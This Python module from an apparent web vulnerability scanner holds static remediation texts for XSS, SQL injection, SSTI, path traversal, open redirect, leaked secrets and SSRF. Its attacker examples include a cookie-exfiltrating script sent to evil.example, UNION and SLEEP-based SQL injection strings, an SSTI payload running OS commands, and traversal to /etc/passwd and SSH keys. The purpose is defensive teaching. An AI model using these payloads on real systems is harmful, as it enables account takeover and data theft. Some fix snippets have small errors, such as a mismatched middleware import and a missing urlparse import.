"""
ProbeX AI – offline fallback remediation library.

When the Gemini API is unavailable (no key, quota exhausted, network error,
timeout) this module provides curated static remediation text that mirrors the
four-section format Gemini is asked to produce.

Design principles
-----------------
- Keyed by ``template_id`` (the detector's identifier) rather than CWE, so the
  text can be hyper-specific to what ProbeX's own detectors actually check.
- A secondary CWE-keyed dict acts as a broader fallback for any template_id
  that doesn't have its own entry.
- Every entry uses the exact four-section format:
    "What this means / How an attacker… / How to fix it / One code example"
  so the UI renders consistently whether Gemini or the fallback is shown.
- This file is the safety net for live demos — it must produce complete,
  professional output with zero API calls.
"""

from __future__ import annotations

# ---------------------------------------------------------------------------
# Primary fallback — keyed by template_id
# ---------------------------------------------------------------------------

OFFLINE_BY_TEMPLATE: dict[str, str] = {

    # -----------------------------------------------------------------------
    # Reflected XSS
    # -----------------------------------------------------------------------
    "xss-reflected": """\
**What this means**
The application reflected unsanitised user input directly into the HTML response. \
When a browser renders that page, any injected script tag executes in the victim's \
session context, giving the attacker full JavaScript control of the page.

**How an attacker could use this**
An attacker crafts a URL such as `/search?q=<script>document.location='https://evil.example/steal?c='+document.cookie</script>` \
and tricks a victim into clicking it. \
The victim's session cookie is silently exfiltrated, allowing account takeover.

**How to fix it**
1. Apply context-aware output encoding before inserting any user-controlled value into HTML: use `html.escape()` in Python or your framework's auto-escape.
2. Set a strict `Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-RANDOM'` header on every response.
3. Use `textContent` instead of `innerHTML` when injecting dynamic values on the client side.

**One code example**
```python
# Before (vulnerable):
return f"<p>Results for: {request.args['q']}</p>"

# After (safe):
import html
safe_q = html.escape(request.args['q'])
return f"<p>Results for: {safe_q}</p>"
```""",

    # -----------------------------------------------------------------------
    # Error-based SQL Injection
    # -----------------------------------------------------------------------
    "sqli-error": """\
**What this means**
The application concatenated user input directly into a SQL query. \
The injected single-quote broke the query syntax, and the database error message \
was returned in the HTTP response, confirming the vulnerability.

**How an attacker could use this**
An attacker iterates through `' UNION SELECT username, password FROM users-- -` \
variants to dump credentials from the database in a single request, \
bypassing all authentication.

**How to fix it**
1. Replace every dynamic SQL string with a parameterised query using DB-API 2 placeholders.
2. Apply the principle of least privilege: the application DB account must not have DROP, ALTER, or FILE rights.
3. Suppress all database error messages from HTTP responses — log them server-side only.

**One code example**
```python
# Before (vulnerable):
cursor.execute(f"SELECT * FROM products WHERE id = {user_id}")

# After (safe):
cursor.execute("SELECT * FROM products WHERE id = %s", (user_id,))
```""",

    # -----------------------------------------------------------------------
    # Security Headers (Missing CSP / X-Frame-Options / HSTS / etc.)
    # -----------------------------------------------------------------------
    "security-headers": """\
**What this means**
One or more HTTP security headers are absent from the server's responses. \
These headers are a zero-cost second layer of defence that tell the browser \
how to safely handle the page's content, framing, and transport.

**How an attacker could use this**
Without `X-Frame-Options` or `frame-ancestors`, any website can embed this page in \
an invisible `<iframe>` and trick users into clicking hidden buttons (clickjacking). \
Without `Content-Security-Policy`, any XSS payload the attacker injects will execute.

**How to fix it**
1. Add `Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-RANDOM'; object-src 'none'` to every response.
2. Add `X-Frame-Options: DENY` (or the equivalent CSP `frame-ancestors 'none'`).
3. For HTTPS sites, add `Strict-Transport-Security: max-age=31536000; includeSubDomains`.

**One code example**
```python
# FastAPI / Starlette middleware (add once, covers all routes):
from starlette.middleware.httpsredirect import HTTPSRedirectMiddleware
app.add_middleware(
    TrustedHostMiddleware, allowed_hosts=["yourdomain.com"]
)

@app.middleware("http")
async def add_security_headers(request, call_next):
    response = await call_next(request)
    response.headers["X-Frame-Options"]         = "DENY"
    response.headers["X-Content-Type-Options"]  = "nosniff"
    response.headers["Content-Security-Policy"] = "default-src 'self'"
    return response
```""",

    # -----------------------------------------------------------------------
    # Time-based blind SQL Injection
    # -----------------------------------------------------------------------
    "sqli-time": """\
**What this means**
The scanner induced a 5-second artificial delay in the server's response by \
injecting `AND SLEEP(5)` into a parameter. \
This confirms the parameter is concatenated into SQL even though no error is visible.

**How an attacker could use this**
An attacker uses time-based blind enumeration to extract the database character-by-character: \
`' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)-- -`. \
Each bit of information costs one request; automated tools (sqlmap) can dump an entire \
database overnight.

**How to fix it**
1. Use parameterised queries for every database call — this is the only reliable fix.
2. Suppress error output AND add a login rate-limit to slow blind timing attacks.
3. Deploy an egress firewall rule so the application server cannot initiate outbound database connections except to your controlled host.

**One code example**
```python
# Before:
query = f"SELECT * FROM users WHERE username = '{username}'"

# After:
query  = "SELECT * FROM users WHERE username = %s"
cursor.execute(query, (username,))
```""",

    # -----------------------------------------------------------------------
    # Server-Side Template Injection
    # -----------------------------------------------------------------------
    "ssti-basic": """\
**What this means**
User input was passed directly to a template engine's `render` function as \
template *source code* (not as a context variable). \
The expression `{{7*7}}` evaluated to `49` in the response, confirming the injection.

**How an attacker could use this**
An attacker escalates to Remote Code Execution via: \
`{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` — \
executing arbitrary OS commands with the web-server process's privileges.

**How to fix it**
1. Pass user data only as **context variables**, never as the template string itself.
2. Use a sandboxed environment (`jinja2.sandbox.SandboxedEnvironment`) if dynamic template generation is unavoidable.
3. Validate that no user-controlled string is ever interpolated into a `render_template_string()` call.

**One code example**
```python
# Before (vulnerable):
render_template_string(user_input)

# After (safe):
render_template_string("<h1>Hello, {{ name }}</h1>", name=user_input)
```""",

    # -----------------------------------------------------------------------
    # Path Traversal
    # -----------------------------------------------------------------------
    "path-traversal": """\
**What this means**
The `file` parameter was accepted verbatim and used to open a file on disk. \
By injecting `../../../../etc/passwd`, the scanner retrieved the OS user list, \
confirming the server does not restrict the base directory.

**How an attacker could use this**
An attacker reads application source code, private keys (`/root/.ssh/id_rsa`), \
or credentials files (`/etc/shadow`, `.env`) without authentication.

**How to fix it**
1. Resolve the full canonical path and verify it starts with your permitted base directory before opening any file.
2. Maintain a server-side allowlist of permitted filenames and map slugs to real paths — never trust the client's filename.
3. Drop filesystem privileges: run the web process as a dedicated low-privilege user with a chroot or container boundary.

**One code example**
```python
from pathlib import Path

BASE = Path("/var/www/app/downloads").resolve()

def safe_open(user_filename: str) -> Path:
    target = (BASE / user_filename).resolve()
    if not str(target).startswith(str(BASE)):
        raise PermissionError("Path traversal detected")
    return target
```""",

    # -----------------------------------------------------------------------
    # Open Redirect
    # -----------------------------------------------------------------------
    "open-redirect": """\
**What this means**
The server issued a 302 redirect to an external URL supplied by the user \
in the `next` parameter without validating the destination.

**How an attacker could use this**
An attacker sends a login link `https://your-site.com/login?next=https://evil.example.com/phishing`. \
After the victim authenticates, they are silently redirected to a phishing page \
that looks like your site but harvests their credentials.

**How to fix it**
1. Accept only **relative paths** starting with `/` and reject any value containing `://` or `//`.
2. If external redirects are required, maintain an explicit allowlist of permitted domains.
3. Never trust a redirect target supplied by the client without server-side verification.

**One code example**
```python
from urllib.parse import urlparse

def safe_redirect(url: str, default: str = "/") -> str:
    parsed = urlparse(url)
    # Reject absolute URLs and protocol-relative URLs
    if parsed.scheme or parsed.netloc or url.startswith("//"):
        return default
    return url
```""",

    # -----------------------------------------------------------------------
    # Sensitive Data Exposure
    # -----------------------------------------------------------------------
    "sensitive-exposure": """\
**What this means**
A secret key or credential was found embedded as a plaintext string literal \
inside a JavaScript file that is served to all visitors. \
Anyone who opens browser DevTools or fetches the bundle can read it.

**How an attacker could use this**
A Stripe live secret key grants the holder full access to charge cards, issue \
refunds, and read customer PII. Automated scanners index public JavaScript bundles \
and will find exposed keys within hours.

**How to fix it**
1. **Revoke and rotate** any exposed key immediately through the provider's console.
2. Move all secrets to server-side environment variables or a secrets manager (AWS Secrets Manager, HashiCorp Vault).
3. Integrate a secrets-scanning tool (TruffleHog, Gitleaks) into your CI pipeline to prevent future leaks.

**One code example**
```bash
# Before (in bundle):
const STRIPE_KEY = 'sk_live_abc123';

# After: expose only from server-side env
# .env (never committed):
STRIPE_SECRET_KEY=sk_live_abc123

# Python:
import os
stripe.api_key = os.environ["STRIPE_SECRET_KEY"]
```""",

    # -----------------------------------------------------------------------
    # SSRF
    # -----------------------------------------------------------------------
    "ssrf-basic": """\
**What this means**
The server fetched the URL supplied by the user without validation. \
The scanner directed it at the AWS EC2 instance metadata endpoint \
(`169.254.169.254`), which returned IAM role credentials.

**How an attacker could use this**
With the returned `AccessKeyId` / `SecretAccessKey` / `Token`, an attacker gains \
temporary AWS credentials and can access any resource the instance role permits — \
S3 buckets, RDS databases, Secrets Manager — without ever breaching the perimeter.

**How to fix it**
1. Validate every user-supplied URL against an allowlist of permitted hosts before the server makes any outbound request.
2. Reject requests to RFC-1918 private ranges, loopback (`127.x`), and link-local (`169.254.x.x`) at both the application and network layers.
3. Enforce IMDSv2 (token-required mode) on all EC2 instances so a simple GET to the metadata endpoint returns 401.

**One code example**
```python
import ipaddress, socket

BLOCKED_NETS = [
    ipaddress.ip_network("169.254.0.0/16"),
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("127.0.0.0/8"),
]

def is_ssrf_safe(url: str) -> bool:
    host = urlparse(url).hostname or ""
    try:
        ip = ipaddress.ip_address(socket.gethostbyname(host))
        return not any(ip in net for net in BLOCKED_NETS)
    except Exception:
        return False
```""",
}

# ---------------------------------------------------------------------------
# Secondary fallback — keyed by CWE (broader net)
# ---------------------------------------------------------------------------

OFFLINE_BY_CWE: dict[str, str] = {
    "CWE-79": OFFLINE_BY_TEMPLATE["xss-reflected"],
    "CWE-89": OFFLINE_BY_TEMPLATE["sqli-error"],
    "CWE-693": OFFLINE_BY_TEMPLATE["security-headers"],
    "CWE-319": OFFLINE_BY_TEMPLATE["security-headers"],
    "CWE-22": OFFLINE_BY_TEMPLATE["path-traversal"],
    "CWE-601": OFFLINE_BY_TEMPLATE["open-redirect"],
    "CWE-94": OFFLINE_BY_TEMPLATE["ssti-basic"],
    "CWE-200": OFFLINE_BY_TEMPLATE["sensitive-exposure"],
    "CWE-918": OFFLINE_BY_TEMPLATE["ssrf-basic"],
}

# ---------------------------------------------------------------------------
# Generic default (absolute last resort)
# ---------------------------------------------------------------------------

DEFAULT_OFFLINE = """\
**What this means**
A security vulnerability was detected in the scanned application. \
Consult the CWE and OWASP references in the finding for detailed classification.

**How an attacker could use this**
Depending on the vulnerability class, an attacker could read sensitive data, \
execute code, or impersonate legitimate users.

**How to fix it**
1. Review the OWASP Top 10 entry and CWE definition linked in the finding.
2. Apply input validation, output encoding, and principle of least privilege.
3. Add relevant HTTP security headers and enable logging for anomalous requests.

**One code example**
```python
# Validate inputs before use:
if not isinstance(user_input, str) or len(user_input) > 256:
    raise ValueError("Invalid input")
```"""


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------


def get_offline_fallback(template_id: str, cwe: str = "") -> str:
    """
    Return the best available static remediation for the given finding.

    Resolution order:
      1. Exact ``template_id`` match  (most specific).
      2. ``cwe`` match in the CWE dict (broader net).
      3. ``DEFAULT_OFFLINE``           (absolute last resort).

    Parameters
    ----------
    template_id:
        The detector template identifier (e.g. ``"xss-reflected"``).
    cwe:
        The CWE identifier (e.g. ``"CWE-79"``).  Optional but improves lookup.

    Returns
    -------
    str
        A complete four-section remediation string, never empty.
    """
    if template_id in OFFLINE_BY_TEMPLATE:
        return OFFLINE_BY_TEMPLATE[template_id]
    if cwe and cwe in OFFLINE_BY_CWE:
        return OFFLINE_BY_CWE[cwe]
    return DEFAULT_OFFLINE
